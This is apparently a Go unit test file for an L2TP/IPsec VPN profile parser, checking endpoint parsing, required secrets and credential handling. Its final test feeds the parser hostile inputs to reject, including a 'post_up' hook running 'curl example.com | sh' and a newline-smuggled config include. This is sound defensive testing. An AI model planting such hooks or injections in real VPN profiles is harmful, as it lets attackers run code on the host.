package externalegress

import (
	"strings"
	"testing"
)

func TestParseL2TPIPsecKeyValueProfile(t *testing.T) {
	raw := "server=vpn.example.com\nusername=provider-user\npassword=provider-password\npsk=provider-psk\nremote_id=gateway.example.com\n"
	preview, err := ParseL2TPIPsec([]byte(raw))
	if err != nil {
		t.Fatalf("ParseL2TPIPsec returned error: %v", err)
	}
	if preview.EndpointHost != "vpn.example.com" || !preview.HasUsername || !preview.HasPassword || !preview.HasPSK {
		t.Fatalf("unexpected preview: %#v", preview)
	}
}

func TestParseL2TPIPsecAllowsSeparateSecrets(t *testing.T) {
	preview, err := ParseL2TPIPsec([]byte(`{"server":"vpn.example.com"}`))
	if err != nil {
		t.Fatalf("ParseL2TPIPsec returned error: %v", err)
	}
	if len(preview.RequiredSecrets) != 3 {
		t.Fatalf("required secrets = %#v, want username/password/preshared_key", preview.RequiredSecrets)
	}
}

func TestParseL2TPIPsecCertificateAuthentication(t *testing.T) {
	preview, err := ParseL2TPIPsec([]byte(`{"server":"192.0.2.10/32","auth_method":"certificate","remote_id":"vpn.example.com"}`))
	if err != nil {
		t.Fatalf("ParseL2TPIPsec returned error: %v", err)
	}
	if preview.EndpointHost != "192.0.2.10" || preview.AuthMethod != "certificate" {
		t.Fatalf("unexpected certificate preview: %#v", preview)
	}
	required := strings.Join(preview.RequiredSecrets, ",")
	for _, purpose := range []string{"username", "password", "ca_certificate", "certificate", "private_key"} {
		if !strings.Contains(required, purpose) {
			t.Fatalf("certificate profile required secrets = %#v, missing %q", preview.RequiredSecrets, purpose)
		}
	}
	if strings.Contains(required, "preshared_key") {
		t.Fatalf("certificate profile unexpectedly requires a PSK: %#v", preview.RequiredSecrets)
	}
}

func TestParseL2TPIPsecRejectsNetworkAsServer(t *testing.T) {
	if _, err := ParseL2TPIPsec([]byte(`server=192.0.2.0/24`)); err == nil {
		t.Fatal("expected a network CIDR to be rejected as a single L2TP server")
	}
}

func TestParseL2TPIPsecJSONPreservesCredentialWhitespace(t *testing.T) {
	preview, err := ParseL2TPIPsec([]byte(`{"server":"vpn.example.com","username":" user ","password":" pass phrase ","psk":" psk value "}`))
	if err != nil {
		t.Fatalf("ParseL2TPIPsec returned error: %v", err)
	}
	if preview.Username != " user " || preview.Password != " pass phrase " || preview.PSK != " psk value " {
		t.Fatalf("credentials were normalized: username=%q password=%q psk=%q", preview.Username, preview.Password, preview.PSK)
	}
}

func TestParseL2TPIPsecRejectsInjectedField(t *testing.T) {
	for _, raw := range []string{
		"server=vpn.example.com\npost_up=curl example.com | sh\n",
		`{"server":"vpn.example.com","post_up":"curl example.com | sh"}`,
		`{"server":"vpn.example.com","remote_id":"gateway.example.com\ninclude injected.conf"}`,
		"server=vpn.example.com\nserver=other.example.com\n",
	} {
		if _, err := ParseL2TPIPsec([]byte(raw)); err == nil {
			t.Fatalf("expected unsafe field to be rejected: %s", raw)
		}
	}
}
